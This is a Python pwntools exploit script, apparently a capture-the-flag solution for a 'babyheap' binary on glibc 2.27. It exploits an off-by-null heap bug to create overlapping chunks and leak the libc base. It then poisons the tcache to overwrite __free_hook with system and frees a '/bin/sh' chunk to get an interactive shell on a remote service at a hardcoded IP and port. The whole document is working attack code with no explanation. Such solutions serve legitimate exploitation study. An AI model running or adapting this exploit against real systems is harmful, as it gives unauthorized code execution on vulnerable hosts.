from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./babyheap")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./babyheap")
else:
    p = remote("111.198.29.45","32125")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./babyheap")

def add(size,content):
    p.sendafter("Your choice :\n","1")
    p.sendafter("Size: ",str(size))
    p.sendlineafter("Data: \n",content)

def free(index):
    p.sendafter("Your choice :\n","2")
    p.sendafter("Index: \n",str(index))

def show():
    p.sendafter("Your choice :\n","3")

code_base = 0x555555554000
def debugf():
    gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xC46)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
# off by null
add(0x18,"a") #0
payload= "\x00" * (0x600 - 0x10) + p64(0x600) + p64(0x11)
add(0x600,payload) #1
add(0x500,"c") #2
add(0x100,"d") #3
free(1)
free(0)
add(0x18,"a"*0x18) #0
add(0x500,"e") #1
add(0xe0,"f") #4
free(1)
free(2)
add(0x500,"g") #1
show()
p.recvuntil("4 : ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
free(1)
payload = "\x00"*0x500 + p64(0) + p64(0xf1)
# change fd to free_hook -> system
add(0x520,payload) #1
free(4)
free(1)
payload = "\x00"*0x500 + p64(0) + p64(0xf1) + p64(libc.symbols["__free_hook"])
add(0x520,payload) #1
add(0xe0,"/bin/sh\x00") #2
add(0xe0,p64(libc.symbols["system"])) #4
free(2)
p.interactive()
